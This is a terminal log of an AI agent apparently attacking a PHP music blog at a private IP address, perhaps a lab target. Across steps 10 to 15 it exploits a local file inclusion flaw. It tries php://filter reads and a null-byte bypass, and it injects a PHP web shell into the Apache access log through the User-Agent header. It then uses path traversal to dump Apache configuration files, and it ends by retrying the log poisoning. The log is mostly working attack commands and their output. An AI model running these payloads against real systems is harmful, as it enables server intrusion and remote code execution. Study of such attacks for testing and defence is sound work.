+<b>Fatal error</b>:  Cannot redeclare handleRequest() (previously declared in /var/www/html/includes/route.php:5) in <b>/var/www/html/includes/route.php</b> on line <b>4</b><br />
+<html lang="en">
+<head>
+        <link rel="stylesheet" type="text/css" href="css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Techno Beat Blog</title>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Techno Beat Blog</h1>
+        <nav>
+            <ul>
+                <li><a href="index.php?#">Home</a></li>
+                <li><a href="index.php?page=page1.php">Ambient Techno</a></li>
+                <li><a href="index.php?page=page2.php">Uk Garage</a></li>
+                <li><a href="index.php?page=page3.php">Minimal House</a></li>
+            </ul>
+        </nav>
+    </header>
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+[95m╭─ 🤔 Agent Reasoning ────────────────────────────────────────────────────────────[0m
+[95m│[0m  [2m### Reflection:[0m
+[95m│[0m  [2m- The same fatal error occurs, indicating that the `route.php` file is being included recursively.[0m
+[95m│[0m  [2m- This suggests that the `page` parameter is directly included in the PHP code without proper sanitization or checks.[0m
+[95m│[0m  [2m### Hypothesis:[0m
+[95m│[0m  [2m- The `index.php` file likely contains logic like:[0m
+[95m│[0m  [2m```php[0m
+[95m│[0m  [2minclude($_GET['page']);[0m
+[95m│[0m  [2m```[0m
+[95m│[0m  [2mor[0m
+[95m│[0m  [2m```php[0m
+[95m│[0m  [2minclude("pages/" . $_GET['page']);[0m
+[95m│[0m  [2m```[0m
+[95m│[0m  [2m- This is a classic **unsanitized file inclusion vulnerability**.[0m
+[95m│[0m  [2m### Next Steps:[0m
+[95m│[0m  [2m1. **Attempt to exploit LFI for RCE** using PHP wrappers (e.g., `php://filter`, `php://input`).[0m
+[95m│[0m  [2m2. **Test log poisoning** to achieve RCE via `/var/log/apache2/access.log`.[0m
+[95m│[0m  [2m---[0m
+[95m│[0m  [2m### Step 8: Exploit LFI for RCE via PHP Wrappers[0m
+[95m│[0m  [2m#### 8.1: Test `php://filter` for Code Disclosure[0m
+[95m│[0m  [2mI will use `php://filter` to read the source code of `index.php` without execution:[0m
+[95m│[0m  [2m```bash[0m
+[95m│[0m  [2mcurl "http://192.168.2.0/index.php?page=php://filter/convert.base64-encode/resource=index.php"[0m
+[95m│[0m  [2m```[0m
+[95m│[0m  [2mThis will return the base64-encoded source code of `index.php`.[0m
+[95m╰───────────────────────────────────────────────────────────────────────────────[0m
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+Step 10/100: [96mshell[0m
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+↳ Running: [92mcurl "http://192.168.2.0/index.php?page=php://filter/convert.base64-encode/resource=index.php"[0m
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+        <link rel="stylesheet" type="text/css" href="css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Techno Beat Blog</title>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Techno Beat Blog</h1>
+        <nav>
+            <ul>
+                <li><a href="index.php?#">Home</a></li>
+                <li><a href="index.php?page=page1.php">Ambient Techno</a></li>
+                <li><a href="index.php?page=page2.php">Uk Garage</a></li>
+                <li><a href="index.php?page=page3.php">Minimal House</a></li>
+            </ul>
+        </nav>
+    </header>
+    
+    <section class="content">
+    <h2> Techno Beat Blog</h2>
+        
+Page not found    </section>
+
+    <footer>
+        <p>&copy; 2024  Blog. All rights reserved.</p>
+    </footer>
+</body>
+</html><html lang="en">
+<head>
+        <link rel="stylesheet" type="text/css" href="css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Techno Beat Blog</title>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Techno Beat Blog</h1>
+        <nav>
+            <ul>
+                <li><a href="index.php?#">Home</a></li>
+                <li><a href="index.php?page=page1.php">Ambient Techno</a></li>
+                <li><a href="index.php?page=page2.php">Uk Garage</a></li>
+                <li><a href="index.php?page=page3.php">Minimal House</a></li>
+            </ul>
+        </nav>
+    </header>
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+[95m╭─ 🤔 Agent Reasoning ────────────────────────────────────────────────────────────[0m
+[95m│[0m  [2m### Reflection:[0m
+[95m│[0m  [2m- The `php://filter` attempt returned "Page not found," indicating that the wrapper may be blocked or the inclusion logic is more complex.[0m
+[95m│[0m  [2m- This suggests that the `page` parameter is not directly included but may be processed (e.g., appended to a directory).[0m
+[95m│[0m  [2m### Adaptation:[0m
+[95m│[0m  [2m- **Option 1:** Try relative paths with `php://filter` (e.g., `page=pages/php://filter/...`).[0m
+[95m│[0m  [2m- **Option 2:** Use `php://input` to inject PHP code via POST data.[0m
+[95m│[0m  [2mI will proceed with **Option 1** first.[0m
+[95m╰───────────────────────────────────────────────────────────────────────────────[0m
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+Step 11/100: [96mshell[0m
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+↳ Running: [92mcurl "http://192.168.2.0/index.php?page=pages/php://filter/convert.base64-encode/resource=index.php"[0m
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+        <link rel="stylesheet" type="text/css" href="css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Techno Beat Blog</title>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Techno Beat Blog</h1>
+        <nav>
+            <ul>
+                <li><a href="index.php?#">Home</a></li>
+                <li><a href="index.php?page=page1.php">Ambient Techno</a></li>
+                <li><a href="index.php?page=page2.php">Uk Garage</a></li>
+                <li><a href="index.php?page=page3.php">Minimal House</a></li>
+            </ul>
+        </nav>
+    </header>
+    
+    <section class="content">
+    <h2> Techno Beat Blog</h2>
+        
+Page not found    </section>
+
+    <footer>
+        <p>&copy; 2024  Blog. All rights reserved.</p>
+    </footer>
+</body>
+</html><html lang="en">
+<head>
+        <link rel="stylesheet" type="text/css" href="css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Techno Beat Blog</title>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Techno Beat Blog</h1>
+        <nav>
+            <ul>
+                <li><a href="index.php?#">Home</a></li>
+                <li><a href="index.php?page=page1.php">Ambient Techno</a></li>
+                <li><a href="index.php?page=page2.php">Uk Garage</a></li>
+                <li><a href="index.php?page=page3.php">Minimal House</a></li>
+            </ul>
+        </nav>
+    </header>
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+[95m╭─ 🤔 Agent Reasoning ────────────────────────────────────────────────────────────[0m
+[95m│[0m  [2m### Reflection:[0m
+[95m│[0m  [2m- The `pages/php://filter` attempt also failed, suggesting that the `page` parameter is not directly prepended with `pages/`.[0m
+[95m│[0m  [2m- The inclusion logic may be more complex (e.g., sanitization, path concatenation).[0m
+[95m│[0m  [2m### Next Step:[0m
+[95m│[0m  [2m- **Attempt log poisoning** to achieve RCE.[0m
+[95m│[0m  [2m- **Steps:**[0m
+[95m│[0m  [2m1. Inject PHP code into the Apache access log via User-Agent.[0m
+[95m│[0m  [2m2. Include the log file using LFI to execute the code.[0m
+[95m│[0m  [2m---[0m
+[95m│[0m  [2m### Step 9: Log Poisoning for RCE[0m
+[95m│[0m  [2m#### 9.1: Inject PHP Code into Access Log[0m
+[95m│[0m  [2mI will send a request with a malicious User-Agent containing PHP code:[0m
+[95m│[0m  [2m```bash[0m
+[95m│[0m  [2mcurl -A "<?php system(\$_GET['cmd']); ?>" "http://192.168.2.0"[0m
+[95m│[0m  [2m```[0m
+[95m│[0m  [2mThis will inject the PHP payload into `/var/log/apache2/access.log` (or equivalent).[0m
+[95m│[0m  [2m#### 9.2: Include the Log File[0m
+[95m│[0m  [2mI will then include the log file using LFI:[0m
+[95m│[0m  [2m```bash[0m
+[95m│[0m  [2mcurl "http://192.168.2.0/index.php?page=../../../../var/log/apache2/access.log&cmd=id"[0m
+[95m│[0m  [2m```[0m
+[95m│[0m  [2mIf successful, this will execute the `id` command and return the output.[0m
+[95m╰───────────────────────────────────────────────────────────────────────────────[0m
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+Step 12/100: [96mshell[0m
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+↳ Executing 2 commands (sequential):
+                                    1. [92mcurl -A "<?php system(\\_GET['cmd']); ?>" "http://192.168.2.0"[0m
+                                    2. [92mcurl "http://192.168.2.0/index.php?page=../../../../var/log/apache2/access.log&cmd=id"[0m
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+        <link rel="stylesheet" type="text/css" href="css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Techno Beat Blog</title>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Techno Beat Blog</h1>
+        <nav>
+            <ul>
+                <li><a href="index.php?#">Home</a></li>
+                <li><a href="index.php?page=page1.php">Ambient Techno</a></li>
+                <li><a href="index.php?page=page2.php">Uk Garage</a></li>
+                <li><a href="index.php?page=page3.php">Minimal House</a></li>
+            </ul>
+        </nav>
+    </header>
+    
+    <section class="content">
+    <h2> Techno Beat Blog</h2>
+            </section>
+
+    <footer>
+        <p>&copy; 2024  Blog. All rights reserved.</p>
+    </footer>
+</body>
+</html><!DOCTYPE html>
+<html lang="en">
+<head>
+        <link rel="stylesheet" type="text/css" href="css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Techno Beat Blog</title>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Techno Beat Blog</h1>
+        <nav>
+            <ul>
+                <li><a href="index.php?#">Home</a></li>
+                <li><a href="index.php?page=page1.php">Ambient Techno</a></li>
+                <li><a href="index.php?page=page2.php">Uk Garage</a></li>
+                <li><a href="index.php?page=page3.php">Minimal House</a></li>
+            </ul>
+        </nav>
+    </header>
+    
+    <section class="content">
+    <h2> Techno Beat Blog</h2>
+        <br />
+<b>Warning</b>:  include(/dev/pts/0): failed to open stream: No such file or directory in <b>/var/www/html/includes/route.php</b> on line <b>10</b><br />
+<br />
+<b>Warning</b>:  include(): Failed opening '../../../../var/log/apache2/access.log' for inclusion (include_path='.:/usr/local/lib/php') in <b>/var/www/html/includes/route.php</b> on line <b>10</b><br />
+    </section>
+
+    <footer>
+        <p>&copy; 2024  Blog. All rights reserved.</p>
+    </footer>
+</body>
+</html><html lang="en">
+<head>
+        <link rel="stylesheet" type="text/css" href="css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Techno Beat Blog</title>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Techno Beat Blog</h1>
+        <nav>
+            <ul>
+                <li><a href="index.php?#">Home</a></li>
+                <li><a href="index.php?page=page1.php">Ambient Techno</a></li>
+                <li><a href="index.php?page=page2.php">Uk Garage</a></li>
+                <li><a href="index.php?page=page3.php">Minimal House</a></li>
+            </ul>
+        </nav>
+    </header>
+<html lang="en">
+<head>
+        <link rel="stylesheet" type="text/css" href="css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Techno Beat Blog</title>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Techno Beat Blog</h1>
+        <nav>
+            <ul>
+                <li><a href="index.php?#">Home</a></li>
+                <li><a href="index.php?page=page1.php">Ambient Techno</a></li>
+                <li><a href="index.php?page=page2.php">Uk Garage</a></li>
+                <li><a href="index.php?page=page3.php">Minimal House</a></li>
+            </ul>
+        </nav>
+    </header>
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+[95m╭─ 🤔 Agent Reasoning ────────────────────────────────────────────────────────────[0m
+[95m│[0m  [2m### Reflection:[0m
+[95m│[0m  [2m- The log poisoning attempt failed because:[0m
+[95m│[0m  [2m- The log file path (`/var/log/apache2/access.log`) does not exist or is not accessible.[0m
+[95m│[0m  [2m- The error message indicates that the inclusion logic is in `/var/www/html/includes/route.php` on line 10.[0m
+[95m│[0m  [2m- The warning `include(/dev/pts/0)` suggests that the `page` parameter is being processed in a way that may involve shell interaction or redirection.[0m
+[95m│[0m  [2m### Next Steps:[0m
+[95m│[0m  [2m1. **Identify the correct log file path** (e.g., `/var/log/nginx/access.log`, `/var/log/httpd/access_log`).[0m
+[95m│[0m  [2m2. **Read `/var/www/html/includes/route.php`** to understand the inclusion logic.[0m
+[95m│[0m  [2m---[0m
+[95m│[0m  [2m### Step 10: Read `route.php` to Understand Inclusion Logic[0m
+[95m│[0m  [2mI will attempt to read the first few lines of `route.php` to identify the log file path or inclusion logic:[0m
+[95m│[0m  [2m```bash[0m
+[95m│[0m  [2mcurl "http://192.168.2.0/index.php?page=../../../../var/www/html/includes/route.php%00"[0m
+[95m│[0m  [2m```[0m
+[95m│[0m  [2mThe null byte (`%00`) may bypass path concatenation.[0m
+[95m╰───────────────────────────────────────────────────────────────────────────────[0m
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+Step 13/100: [96mshell[0m
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+↳ Running: [92mcurl "http://192.168.2.0/index.php?page=../../../../var/www/html/includes/route.php%00"[0m
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+        <link rel="stylesheet" type="text/css" href="css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Techno Beat Blog</title>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Techno Beat Blog</h1>
+        <nav>
+            <ul>
+                <li><a href="index.php?#">Home</a></li>
+                <li><a href="index.php?page=page1.php">Ambient Techno</a></li>
+                <li><a href="index.php?page=page2.php">Uk Garage</a></li>
+                <li><a href="index.php?page=page3.php">Minimal House</a></li>
+            </ul>
+        </nav>
+    </header>
+    
+    <section class="content">
+    <h2> Techno Beat Blog</h2>
+        <br />
+<b>Warning</b>:  file_exists() expects parameter 1 to be a valid path, string given in <b>/var/www/html/includes/route.php</b> on line <b>9</b><br />
+
+Page not found    </section>
+
+    <footer>
+        <p>&copy; 2024  Blog. All rights reserved.</p>
+    </footer>
+</body>
+</html><html lang="en">
+<head>
+        <link rel="stylesheet" type="text/css" href="css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Techno Beat Blog</title>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Techno Beat Blog</h1>
+        <nav>
+            <ul>
+                <li><a href="index.php?#">Home</a></li>
+                <li><a href="index.php?page=page1.php">Ambient Techno</a></li>
+                <li><a href="index.php?page=page2.php">Uk Garage</a></li>
+                <li><a href="index.php?page=page3.php">Minimal House</a></li>
+            </ul>
+        </nav>
+    </header>
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+[95m╭─ 🤔 Agent Reasoning ────────────────────────────────────────────────────────────[0m
+[95m│[0m  [2m### Analysis:[0m
+[95m│[0m  [2m- The error message:[0m
+[95m│[0m  [2m```[0m
+[95m│[0m  [2mWarning: file_exists() expects parameter 1 to be a valid path, string given in /var/www/html/includes/route.php on line 9[0m
+[95m│[0m  [2m```[0m
+[95m│[0m  [2msuggests that the `page` parameter is passed to `file_exists()` before inclusion.[0m
+[95m│[0m  [2m- This implies that the inclusion logic is:[0m
+[95m│[0m  [2m```php[0m
+[95m│[0m  [2mif (file_exists($page)) {[0m
+[95m│[0m  [2minclude($page);[0m
+[95m│[0m  [2m}[0m
+[95m│[0m  [2m```[0m
+[95m│[0m  [2m- The null byte did not bypass the check, likely due to PHP's security patches.[0m
+[95m│[0m  [2m### Next Steps:[0m
+[95m│[0m  [2m1. **Identify the correct log file path** by reading `/etc/apache2/apache2.conf` or `/etc/nginx/nginx.conf`.[0m
+[95m│[0m  [2m2. **Use `php://input` for RCE** if the log file path cannot be determined.[0m
+[95m│[0m  [2m---[0m
+[95m│[0m  [2m### Step 11: Read Apache/Nginx Configuration[0m
+[95m│[0m  [2mI will attempt to read the Apache configuration file to locate the access log path:[0m
+[95m│[0m  [2m```bash[0m
+[95m│[0m  [2mcurl "http://192.168.2.0/index.php?page=../../../../etc/apache2/apache2.conf"[0m
+[95m│[0m  [2m```[0m
+[95m╰───────────────────────────────────────────────────────────────────────────────[0m
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+Step 14/100: [96mshell[0m
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+↳ Running: [92mcurl "http://192.168.2.0/index.php?page=../../../../etc/apache2/apache2.conf"[0m
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+        <link rel="stylesheet" type="text/css" href="css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Techno Beat Blog</title>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Techno Beat Blog</h1>
+        <nav>
+            <ul>
+                <li><a href="index.php?#">Home</a></li>
+                <li><a href="index.php?page=page1.php">Ambient Techno</a></li>
+                <li><a href="index.php?page=page2.php">Uk Garage</a></li>
+                <li><a href="index.php?page=page3.php">Minimal House</a></li>
+            </ul>
+        </nav>
+    </header>
+    
+    <section class="content">
+    <h2> Techno Beat Blog</h2>
+        # This is the main Apache server configuration file.  It contains the
+# configuration directives that give the server its instructions.
+# See http://httpd.apache.org/docs/2.4/ for detailed information about
+# the directives and /usr/share/doc/apache2/README.Debian about Debian specific
+# hints.
+#
+#
+# Summary of how the Apache 2 configuration works in Debian:
+# The Apache 2 web server configuration in Debian is quite different to
+# upstream's suggested way to configure the web server. This is because Debian's
+# default Apache2 installation attempts to make adding and removing modules,
+# virtual hosts, and extra configuration directives as flexible as possible, in
+# order to make automating the changes and administering the server as easy as
+# possible.
+
+# It is split into several files forming the configuration hierarchy outlined
+# below, all located in the /etc/apache2/ directory:
+#
+#	/etc/apache2/
+#	|-- apache2.conf
+#	|	`--  ports.conf
+#	|-- mods-enabled
+#	|	|-- *.load
+#	|	`-- *.conf
+#	|-- conf-enabled
+#	|	`-- *.conf
+# 	`-- sites-enabled
+#	 	`-- *.conf
+#
+#
+# * apache2.conf is the main configuration file (this file). It puts the pieces
+#   together by including all remaining configuration files when starting up the
+#   web server.
+#
+# * ports.conf is always included from the main configuration file. It is
+#   supposed to determine listening ports for incoming connections which can be
+#   customized anytime.
+#
+# * Configuration files in the mods-enabled/, conf-enabled/ and sites-enabled/
+#   directories contain particular configuration snippets which manage modules,
+#   global configuration fragments, or virtual host configurations,
+#   respectively.
+#
+#   They are activated by symlinking available configuration files from their
+#   respective *-available/ counterparts. These should be managed by using our
+#   helpers a2enmod/a2dismod, a2ensite/a2dissite and a2enconf/a2disconf. See
+#   their respective man pages for detailed information.
+#
+# * The binary is called apache2. Due to the use of environment variables, in
+#   the default configuration, apache2 needs to be started/stopped with
+#   /etc/init.d/apache2 or apache2ctl. Calling /usr/bin/apache2 directly will not
+#   work with the default configuration.
+
+
+# Global configuration
+#
+
+#
+# ServerRoot: The top of the directory tree under which the server's
+# configuration, error, and log files are kept.
+#
+# NOTE!  If you intend to place this on an NFS (or otherwise network)
+# mounted filesystem then please read the Mutex documentation (available
+# at <URL:http://httpd.apache.org/docs/2.4/mod/core.html#mutex>);
+# you will save yourself a lot of trouble.
+#
+# Do NOT add a slash at the end of the directory path.
+#
+#ServerRoot "/etc/apache2"
+
+#
+# The accept serialization lock file MUST BE STORED ON A LOCAL DISK.
+#
+#Mutex file:${APACHE_LOCK_DIR} default
+
+#
+# The directory where shm and other runtime files will be stored.
+#
+
+DefaultRuntimeDir ${APACHE_RUN_DIR}
+
+#
+# PidFile: The file in which the server should record its process
+# identification number when it starts.
+# This needs to be set in /etc/apache2/envvars
+#
+PidFile ${APACHE_PID_FILE}
+
+#
+# Timeout: The number of seconds before receives and sends time out.
+#
+Timeout 300
+
+#
+# KeepAlive: Whether or not to allow persistent connections (more than
+# one request per connection). Set to "Off" to deactivate.
+#
+KeepAlive On
+
+#
+# MaxKeepAliveRequests: The maximum number of requests to allow
+# during a persistent connection. Set to 0 to allow an unlimited amount.
+# We recommend you leave this number high, for maximum performance.
+#
+MaxKeepAliveRequests 100
+
+#
+# KeepAliveTimeout: Number of seconds to wait for the next request from the
+# same client on the same connection.
+#
+KeepAliveTimeout 5
+
+
+# These need to be set in /etc/apache2/envvars
+User ${APACHE_RUN_USER}
+Group ${APACHE_RUN_GROUP}
+
+#
+# HostnameLookups: Log the names of clients or just their IP addresses
+# e.g., www.apache.org (on) or 204.62.129.132 (off).
+# The default is off because it'd be overall better for the net if people
+# had to knowingly turn this feature on, since enabling it means that
+# each client request will result in AT LEAST one lookup request to the
+# nameserver.
+#
+HostnameLookups Off
+
+# ErrorLog: The location of the error log file.
+# If you do not specify an ErrorLog directive within a <VirtualHost>
+# container, error messages relating to that virtual host will be
+# logged here.  If you *do* define an error logfile for a <VirtualHost>
+# container, that host's errors will be logged there and not here.
+#
+ErrorLog ${APACHE_LOG_DIR}/error.log
+
+#
+# LogLevel: Control the severity of messages logged to the error_log.
+# Available values: trace8, ..., trace1, debug, info, notice, warn,
+# error, crit, alert, emerg.
+# It is also possible to configure the log level for particular modules, e.g.
+# "LogLevel info ssl:warn"
+#
+LogLevel warn
+
+# Include module configuration:
+IncludeOptional mods-enabled/*.load
+IncludeOptional mods-enabled/*.conf
+
+# Include list of ports to listen on
+Include ports.conf
+
+
+# Sets the default security model of the Apache2 HTTPD server. It does
+# not allow access to the root filesystem outside of /usr/share and /var/www.
+# The former is used by web applications packaged in Debian,
+# the latter may be used for local directories served by the web server. If
+# your system is serving content from a sub-directory in /srv you must allow
+# access here, or in any related virtual host.
+<Directory />
+	Options FollowSymLinks
+	AllowOverride None
+	Require all denied
+</Directory>
+
+<Directory /usr/share>
+	AllowOverride None
+	Require all granted
+</Directory>
+
+<Directory /var/www/>
+	Options Indexes FollowSymLinks
+	AllowOverride None
+	Require all granted
+</Directory>
+
+#<Directory /srv/>
+#	Options Indexes FollowSymLinks
+#	AllowOverride None
+#	Require all granted
+#</Directory>
+
+
+
+
+# AccessFileName: The name of the file to look for in each directory
+# for additional configuration directives.  See also the AllowOverride
+# directive.
+#
+AccessFileName .htaccess
+
+#
+# The following lines prevent .htaccess and .htpasswd files from being
+# viewed by Web clients.
+#
+<FilesMatch "^\.ht">
+	Require all denied
+</FilesMatch>
+
+
+#
+# The following directives define some format nicknames for use with
+# a CustomLog directive.
+#
+# These deviate from the Common Log Format definitions in that they use %O
+# (the actual bytes sent including headers) instead of %b (the size of the
+# requested file), because the latter makes it impossible to detect partial
+# requests.
+#
+# Note that the use of %{X-Forwarded-For}i instead of %h is not recommended.
+# Use mod_remoteip instead.
+#
+LogFormat "%v:%p %h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\"" vhost_combined
+LogFormat "%h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\"" combined
+LogFormat "%h %l %u %t \"%r\" %>s %O" common
+LogFormat "%{Referer}i -> %U" referer
+LogFormat "%{User-agent}i" agent
+
+# Include of directories ignores editors' and dpkg's backup files,
+# see README.Debian for details.
+
+# Include generic snippets of statements
+IncludeOptional conf-enabled/*.conf
+
+# Include the virtual host configurations:
+IncludeOptional sites-enabled/*.conf
+
+# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
+    </section>
+
+    <footer>
+        <p>&copy; 2024  Blog. All rights reserved.</p>
+    </footer>
+</body>
+</html><html lang="en">
+<head>
+        <link rel="stylesheet" type="text/css" href="css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Techno Beat Blog</title>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Techno Beat Blog</h1>
+        <nav>
+            <ul>
+                <li><a href="index.php?#">Home</a></li>
+                <li><a href="index.php?page=page1.php">Ambient Techno</a></li>
+                <li><a href="index.php?page=page2.php">Uk Garage</a></li>
+                <li><a href="index.php?page=page3.php">Minimal House</a></li>
+            </ul>
+        </nav>
+    </header>
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+[95m╭─ 🤔 Agent Reasoning ────────────────────────────────────────────────────────────[0m
+[95m│[0m  [2m### Analysis:[0m
+[95m│[0m  [2m- The Apache configuration file reveals:[0m
+[95m│[0m  [2m- **Error Log Path:** `${APACHE_LOG_DIR}/error.log`[0m
+[95m│[0m  [2m- **Access Log Path:** Not explicitly defined here, but typically in `/etc/apache2/envvars` or a virtual host configuration.[0m
+[95m│[0m  [2m- **Default Log Directory:** `/var/log/apache2/`[0m
+[95m│[0m  [2m- The log format includes `%{User-Agent}i`, meaning the User-Agent is logged.[0m
+[95m│[0m  [2m### Next Steps:[0m
+[95m│[0m  [2m1. **Read `/etc/apache2/envvars`** to determine `${APACHE_LOG_DIR}`.[0m
+[95m│[0m  [2m2. **Attempt log poisoning again** with the correct log file path.[0m
+[95m│[0m  [2m---[0m
+[95m│[0m  [2m### Step 12: Read `/etc/apache2/envvars`[0m
+[95m╰───────────────────────────────────────────────────────────────────────────────[0m
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+Step 15/100: [96mshell[0m
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+↳ Running: [92mcurl "http://192.168.2.0/index.php?page=../../../../etc/apache2/envvars"[0m
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+        <link rel="stylesheet" type="text/css" href="css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Techno Beat Blog</title>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Techno Beat Blog</h1>
+        <nav>
+            <ul>
+                <li><a href="index.php?#">Home</a></li>
+                <li><a href="index.php?page=page1.php">Ambient Techno</a></li>
+                <li><a href="index.php?page=page2.php">Uk Garage</a></li>
+                <li><a href="index.php?page=page3.php">Minimal House</a></li>
+            </ul>
+        </nav>
+    </header>
+    
+    <section class="content">
+    <h2> Techno Beat Blog</h2>
+        # envvars - default environment variables for apache2ctl
+
+# this won't be correct after changing uid
+unset HOME
+
+# for supporting multiple apache2 instances
+if [ "${APACHE_CONFDIR##/etc/apache2-}" != "${APACHE_CONFDIR}" ] ; then
+	SUFFIX="-${APACHE_CONFDIR##/etc/apache2-}"
+else
+	SUFFIX=
+fi
+
+# Since there is no sane way to get the parsed apache2 config in scripts, some
+# settings are defined via environment variables and then used in apache2ctl,
+# /etc/init.d/apache2, /etc/logrotate.d/apache2, etc.
+: ${APACHE_RUN_USER:=www-data}
+export APACHE_RUN_USER
+: ${APACHE_RUN_GROUP:=www-data}
+export APACHE_RUN_GROUP
+# temporary state file location. This might be changed to /run in Wheezy+1
+: ${APACHE_PID_FILE:=/var/run/apache2$SUFFIX/apache2.pid}
+export APACHE_PID_FILE
+: ${APACHE_RUN_DIR:=/var/run/apache2$SUFFIX}
+export APACHE_RUN_DIR
+: ${APACHE_LOCK_DIR:=/var/lock/apache2$SUFFIX}
+export APACHE_LOCK_DIR
+# Only /var/log/apache2 is handled by /etc/logrotate.d/apache2.
+: ${APACHE_LOG_DIR:=/var/log/apache2$SUFFIX}
+export APACHE_LOG_DIR
+
+## The locale used by some modules like mod_dav
+: ${LANG:=C}
+export LANG
+## Uncomment the following line to use the system default locale instead:
+#. /etc/default/locale
+
+export LANG
+
+## The command to get the status for 'apache2ctl status'.
+## Some packages providing 'www-browser' need '--dump' instead of '-dump'.
+#export APACHE_LYNX='www-browser -dump'
+
+## If you need a higher file descriptor limit, uncomment and adjust the
+## following line (default is 8192):
+#APACHE_ULIMIT_MAX_FILES='ulimit -n 65536'
+
+## If you would like to pass arguments to the web server, add them below
+## to the APACHE_ARGUMENTS environment.
+#export APACHE_ARGUMENTS=''
+
+## Enable the debug mode for maintainer scripts.
+## This will produce a verbose output on package installations of web server modules and web application
+## installations which interact with Apache
+#export APACHE2_MAINTSCRIPT_DEBUG=1
+    </section>
+
+    <footer>
+        <p>&copy; 2024  Blog. All rights reserved.</p>
+    </footer>
+</body>
+</html><html lang="en">
+<head>
+        <link rel="stylesheet" type="text/css" href="css/style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Techno Beat Blog</title>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Techno Beat Blog</h1>
+        <nav>
+            <ul>
+                <li><a href="index.php?#">Home</a></li>
+                <li><a href="index.php?page=page1.php">Ambient Techno</a></li>
+                <li><a href="index.php?page=page2.php">Uk Garage</a></li>
+                <li><a href="index.php?page=page3.php">Minimal House</a></li>
+            </ul>
+        </nav>
+    </header>
+
+
+[2m────────────────────────────────────────────────────────────────────────────────[0m
+
+[95m╭─ 🤔 Agent Reasoning ────────────────────────────────────────────────────────────[0m
+[95m│[0m  [2m### Critical Finding:[0m
+[95m│[0m  [2m- The Apache log directory is confirmed as:[0m
+[95m│[0m  [2m```bash[0m
+[95m│[0m  [2m: ${APACHE_LOG_DIR:=/var/log/apache2$SUFFIX}[0m
+[95m│[0m  [2mexport APACHE_LOG_DIR[0m
+[95m│[0m  [2m```[0m
+[95m│[0m  [2m- This defaults to `/var/log/apache2` (since `$SUFFIX` is empty).[0m
+[95m│[0m  [2m- The access log is likely at `/var/log/apache2/access.log`.[0m
+[95m│[0m  [2m---[0m
+[95m│[0m  [2m### Step 13: Retry Log Poisoning with Correct Path[0m
+[95m│[0m  [2m#### 13.1: Inject PHP Code into Access Log[0m
+[95m│[0m  [2m```bash[0m
+[95m│[0m  [2mcurl -A "<?php system(\$_GET['cmd']); ?>" "http://192.168.2.0"[0m
